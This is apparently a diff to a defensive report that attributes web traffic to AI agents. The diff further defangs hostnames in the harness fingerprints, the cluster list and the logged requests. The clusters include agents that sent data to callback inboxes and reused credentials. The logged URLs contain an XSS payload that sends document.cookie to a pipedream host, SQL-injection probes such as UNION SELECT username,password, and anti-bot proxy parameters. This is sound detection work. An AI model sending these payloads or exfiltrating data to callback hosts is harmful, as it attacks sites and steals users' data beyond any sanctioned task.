@@ -92,7 +92,7 @@ Each claim gives its layer, label (Confirmed, Suspected, Possible, Unattributed)
 
 **Harness and framework candidates** (ranked; never named as the source in public):
 
-1. browser automation (Mozilla-compatible user agent). Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36`; 1 record(s) sent User-Agent `Mozilla/5.0 (compatible; ExaSearchBot/1.0; +hxxps://crawler[.]exa[.]ai/)`; 1 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.pentest_ua; 1 record(s) match header fingerprint rule header.ua_platform_mismatch; 1 record(s) send the header-name set 4c117166 (cf-brapi-devtools); 1 record(s) encode URLs in style `sp+.raw.noslash`; 8 record(s) sent User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`; 5 record(s) encode URLs in style `hexU.noslash`; 3 record(s) sent User-Agent `Mozilla/5.0 (X11; Linux x86_64) HeadlessChrome/124.0`; 3 record(s) match header fingerprint rule header.headless_ua; 3 record(s) match header fingerprint rule header.scripted_ua; 6 record(s) sent User-Agent `Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0`; 5 record(s) encode URLs in style `sp20.noslash`; 5 record(s) sent User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`; 2 record(s) encode URLs in style `sp20.noslash`; 4 record(s) sent User-Agent `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15`; 2 record(s) encode URLs in style `sp20.hexU.noslash`; 4 record(s) sent User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0`; 3 record(s) encode URLs in style `sp20.unsorted.noslash`; 1 record(s) sent User-Agent `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +hxxps://openai[.]com/bot`; 1 record(s) encode URLs in style `dbl.sorted.noslash`; 1 record(s) sent User-Agent `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0 Safari/537.36`; 1 record(s) match header fingerprint rule header.gzip_only_requests; 2 record(s) match header fingerprint rule header.headless_ua; 1 record(s) match header fingerprint rule header.scripted_ua; 1 record(s) match header fingerprint rule header.via_ats; 1 record(s) send the header-name set ef2d658b (accept-encoding, via); 1 record(s) sent User-Agent `Mozilla/5.0 (compatible; Claude-User/1.0; +Claude-User@anthropic.com)`; 1 record(s) sent User-Agent `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; Kimi-User/1.0; +hxxps://www[.]kimi[.]com/policies/kimi-crawlers`; 2 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.markdown_accept; 1 record(s) send the header-name set bccc78e9 (accept).
+1. browser automation (Mozilla-compatible user agent). Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36`; 1 record(s) sent User-Agent `Mozilla/5.0 (compatible; ExaSearchBot/1.0; +hxxps://crawler[.]exa[.]ai/)`; 1 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.pentest_ua; 1 record(s) match header fingerprint rule header.ua_platform_mismatch; 1 record(s) send the header-name set 4c117166 (cf-brapi-devtools); 1 record(s) encode URLs in style `sp+.raw.noslash`; 8 record(s) sent User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`; 5 record(s) encode URLs in style `hexU.noslash`; 3 record(s) sent User-Agent `Mozilla/5.0 (X11; Linux x86_64) HeadlessChrome/124.0`; 3 record(s) match header fingerprint rule header.headless_ua; 3 record(s) match header fingerprint rule header.scripted_ua; 6 record(s) sent User-Agent `Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0`; 5 record(s) encode URLs in style `sp20.noslash`; 5 record(s) sent User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`; 2 record(s) encode URLs in style `sp20.noslash`; 4 record(s) sent User-Agent `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15`; 2 record(s) encode URLs in style `sp20.hexU.noslash`; 4 record(s) sent User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0`; 3 record(s) encode URLs in style `sp20.unsorted.noslash`; 1 record(s) sent User-Agent `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +hxxps://openai[.]com/bot`; 1 record(s) encode URLs in style `dbl.sorted.noslash`; 1 record(s) sent User-Agent `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0 Safari/537.36`; 1 record(s) match header fingerprint rule header.gzip_only_requests; 2 record(s) match header fingerprint rule header.headless_ua; 1 record(s) match header fingerprint rule header.scripted_ua; 1 record(s) match header fingerprint rule header.via_ats; 1 record(s) send the header-name set ef2d658b (accept-encoding, via); 1 record(s) sent User-Agent `Mozilla/5.0 (compatible; Claude-User/1.0; +Claude-User@anthropic[.]com)`; 1 record(s) sent User-Agent `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; Kimi-User/1.0; +hxxps://www[.]kimi[.]com/policies/kimi-crawlers`; 2 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.markdown_accept; 1 record(s) send the header-name set bccc78e9 (accept).
 2. schedrunner. Label: Possible; tag: Inference. Traces: 8 record(s) sent User-Agent `SchedRunner/3.2`.
 3. sqlmap. Label: Possible; tag: Inference. Traces: 8 record(s) sent User-Agent `sqlmap/1.8.4#stable (hxxps://sqlmap[.]org)`; 8 record(s) match header fingerprint rule header.pentest_ua; 8 record(s) encode URLs in style `sp20.noslash`.
 4. curl. Label: Possible; tag: Inference. Traces: 5 record(s) sent User-Agent `curl/8.5.0`; 5 record(s) match header fingerprint rule header.scripted_ua; 5 record(s) encode URLs in style `sp20.sorted.noslash`.
@@ -101,7 +101,7 @@ Each claim gives its layer, label (Confirmed, Suspected, Possible, Unattributed)
 7. python-requests. Label: Possible; tag: Inference. Traces: 3 record(s) sent User-Agent `python-requests/2.31.0`; 3 record(s) match header fingerprint rule header.scripted_ua; 2 record(s) encode URLs in style `sp20.sorted.noslash`.
 8. scoutagent. Label: Possible; tag: Inference. Traces: 3 record(s) sent User-Agent `ScoutAgent/1.0`.
 9. modelcontextprotocol. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `ModelContextProtocol/1.0 (Autonomous; +hxxps://github[.]com/modelcontextprotocol/servers)`; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.mcp_fetch_ua; 1 record(s) send the header-name set 5b6270b3 (cf-brapi-request-id).
-10. nuclei. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Nuclei - Open-source project (github.com/projectdiscovery/nuclei)`; 1 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.pentest_ua; 1 record(s) match header fingerprint rule header.ua_platform_mismatch; 1 record(s) send the header-name set 4c117166 (cf-brapi-devtools); 1 record(s) encode URLs in style `sp+.raw.noslash`.
+10. nuclei. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Nuclei - Open-source project (github[.]com/projectdiscovery/nuclei)`; 1 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.pentest_ua; 1 record(s) match header fingerprint rule header.ua_platform_mismatch; 1 record(s) send the header-name set 4c117166 (cf-brapi-devtools); 1 record(s) encode URLs in style `sp+.raw.noslash`.
 11. playwright. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Playwright/1.48`; 1 record(s) match header fingerprint rule header.gzip_only_requests; 2 record(s) match header fingerprint rule header.headless_ua; 1 record(s) match header fingerprint rule header.scripted_ua; 1 record(s) match header fingerprint rule header.via_ats; 1 record(s) send the header-name set ef2d658b (accept-encoding, via).
 
 ## Why we think this is an agent
@@ -384,7 +384,7 @@ Every flagged request to each host, including requests outside the linked cluste
   - payload dialect `3e4414d1` over 8 records: sqli (quote_or_1eq1 ×8). Which canonical test payloads a client reaches for is consistent with one model or tool, not evidence on its own
 - **C7** (significant): 6 records, 1 run(s), 2026-03-09 09:00:00 UTC → 2026-03-09 09:05:00 UTC, median gap 60s
   - artifacts: 6 of 6 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
-  - linked by: `exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`, `param:uqtag=ag1x`, `param:uqtag=ag2y`
+  - linked by: `exfil.webhook_site:webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`, `param:uqtag=ag1x`, `param:uqtag=ag2y`
   - provenance: unknown 6 · single source
   - scope: scope exceeded · task class data retrieval; failed: S6 (data was sent to a callback inbox or side channel); S7 (an interaction edge ties this cluster's runs to another's while S6 fails)
 - **C8** (significant): 6 records, 1 run(s), 2026-05-11 14:02:10 UTC → 2026-05-11 14:07:35 UTC, median gap 62s
@@ -478,7 +478,7 @@ Every flagged request to each host, including requests outside the linked cluste
   - provenance: unknown 3 · single source
   - scope: scope exceeded · task class account setup; failed: S5 (accounts or credentials were acquired or reused); S6 (data was sent to a callback inbox or side channel)
 - **C23** (significant): 3 records, 2 run(s), 2026-08-06 16:00:00 UTC → 2026-08-07 12:00:00 UTC, median gap 20.0h
-  - linked by: `exfil.requestbin:c0ve7x9.m.pipedream.net`
+  - linked by: `exfil.requestbin:c0ve7x9[.]m[.]pipedream[.]net`
   - provenance: unknown 3 · single source
   - scope: scope exceeded · task class unclear; failed: S4 (attack payloads were sent to a party that did not sanction them); S5 (accounts or credentials were acquired or reused); S6 (data was sent to a callback inbox or side channel)
   - relay stack `carrier.html_program → carrier.inline_fetch_program → target` on 1 records: one client's habit, not evidence on its own
@@ -632,11 +632,11 @@ Every flagged request to each host, including requests outside the linked cluste
   - provenance: unknown 2 · single source
   - scope: scope exceeded · task class data retrieval; failed: S2 (the route climbed to reach one target, past a block)
 - **C52** (suggestive): 2 records, 1 run(s), 2026-08-06 14:00:00 UTC → 2026-08-06 14:00:30 UTC, median gap 30s
-  - linked by: `exfil.webhook_site:webhook.site/deadbeef-0000-4000-8000-00000000c0de`
+  - linked by: `exfil.webhook_site:webhook[.]site/deadbeef-0000-4000-8000-00000000c0de`
   - provenance: unknown 2 · single source
   - scope: scope exceeded · task class unclear; failed: S6 (data was sent to a callback inbox or side channel)
 - **C53** (suggestive): 2 records, 1 run(s), 2026-08-07 09:00:00 UTC → 2026-08-07 09:01:00 UTC, median gap 60s
-  - linked by: `exfil.ntfy:/ntfy.sh/covrun7results`
+  - linked by: `exfil.ntfy:/ntfy[.]sh/covrun7results`
   - provenance: unknown 2 · single source
   - scope: scope exceeded · task class unclear; failed: S6 (data was sent to a callback inbox or side channel)
 - **C54** (suggestive): 2 records, 1 run(s), 2026-08-12 09:00:00 UTC → 2026-08-12 09:05:00 UTC, median gap 5m
@@ -665,7 +665,7 @@ For each cluster, the window to search, what its times measure, and the strings 
 - **C6**: 2026-09-20 10:00:00 UTC to 2026-09-20 10:02:24 UTC, times a scan service received each URL; the request to the target followed within seconds to minutes
   - identifiers: `param:uqtag=xsvA41`
 - **C7**: 2026-03-09 09:00:00 UTC to 2026-03-09 09:05:00 UTC, times of unknown kind
-  - identifiers: `exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`, `param:uqtag=ag1x`, `param:uqtag=ag2y`
+  - identifiers: `exfil.webhook_site:webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`, `param:uqtag=ag1x`, `param:uqtag=ag2y`
 - **C8**: 2026-05-11 14:02:10 UTC to 2026-05-11 14:07:35 UTC, times of unknown kind
 - **C9**: 2026-09-20 12:00:00 UTC to 2026-09-20 12:02:03 UTC, times a scan service received each URL; the request to the target followed within seconds to minutes
   - identifiers: `param:uqtag=gwP7q2`
@@ -690,7 +690,7 @@ For each cluster, the window to search, what its times measure, and the strings 
 - **C22**: 2026-08-05 10:00:00 UTC to 2026-08-07 13:00:00 UTC, times of unknown kind
   - identifiers: `param:uqtag=covrun7`
 - **C23**: 2026-08-06 16:00:00 UTC to 2026-08-07 12:00:00 UTC, times of unknown kind
-  - identifiers: `exfil.requestbin:c0ve7x9.m.pipedream.net`
+  - identifiers: `exfil.requestbin:c0ve7x9[.]m[.]pipedream[.]net`
 - **C24**: 2026-08-14 10:00:00 UTC to 2026-08-14 10:01:25 UTC, times of unknown kind
 - **C25**: 2026-04-01 06:03:41 UTC to 2026-04-01 06:06:01 UTC, archive capture times: when an archive saved each URL, which may be long after it was sent
   - identifiers: `param:uqtag=la1q7c`
@@ -736,9 +736,9 @@ For each cluster, the window to search, what its times measure, and the strings 
 - **C50**: 2026-07-02 10:07:00 UTC to 2026-07-02 10:10:00 UTC, times of unknown kind
 - **C51**: 2026-07-02 10:21:00 UTC to 2026-07-02 10:23:00 UTC, times of unknown kind
 - **C52**: 2026-08-06 14:00:00 UTC to 2026-08-06 14:00:30 UTC, times of unknown kind
-  - identifiers: `exfil.webhook_site:webhook.site/deadbeef-0000-4000-8000-00000000c0de`
+  - identifiers: `exfil.webhook_site:webhook[.]site/deadbeef-0000-4000-8000-00000000c0de`
 - **C53**: 2026-08-07 09:00:00 UTC to 2026-08-07 09:01:00 UTC, times of unknown kind
-  - identifiers: `exfil.ntfy:/ntfy.sh/covrun7results`
+  - identifiers: `exfil.ntfy:/ntfy[.]sh/covrun7results`
 - **C54**: 2026-08-12 09:00:00 UTC to 2026-08-12 09:05:00 UTC, times of unknown kind
 - **C55**: 2026-08-12 09:50:00 UTC to 2026-08-12 09:55:00 UTC, times of unknown kind
 - **C56**: 2026-08-14 09:00:00 UTC to 2026-08-14 09:03:00 UTC, times of unknown kind
@@ -827,11 +827,11 @@ Signs that a cluster's records were placed to be found. Prompts to check, never 
 
 URLs are defanged. Records are listed by evidence strength.
 
-1. 2026-08-07 12:00:00 UTC: `hxxps://records[.]agency[.]example/search?q=%3Cscript%3Efetch(%27//c0ve7x9.m.pipedream.net/?c=%27%2Bdocument.cookie)%3C/script%3E`
+1. 2026-08-07 12:00:00 UTC: `hxxps://records[.]agency[.]example/search?q=%3Cscript%3Efetch(%27//c0ve7x9[.]m[.]pipedream[.]net/?c=%27%2Bdocument.cookie)%3C/script%3E`
    - rules: carrier.inline_fetch_program, carrier.html_program, exfil.requestbin, exfil.cookie, exploit.xss
-1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords.agency.example%2Fitems%3Fid%3D1%2527`
+1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords[.]agency[.]example%2Fitems%3Fid%3D1%2527`
    - rules: relay.scrape_api, marker.placeholder, exploit.double_encoded_meta, exploit.sqli_quote
-1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords.agency.example%2Fitems%3Fid%3D1%2527&stealth_proxy=true`
+1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords[.]agency[.]example%2Fitems%3Fid%3D1%2527&stealth_proxy=true`
    - rules: relay.scrape_api, marker.placeholder, antibot.unblocker_params, exploit.double_encoded_meta, exploit.sqli_quote
 1. 2026-09-02 14:00:00 UTC: `hxxps://r[.]jina[.]ai/hxxps://records[.]plant-a[.]example/search?id=1%20UNION%20SELECT%20username,password%20FROM%20users--&uqtag=pl4nt1`
    - rules: relay.jina, exploit.sqli_union, marker.uq_tags
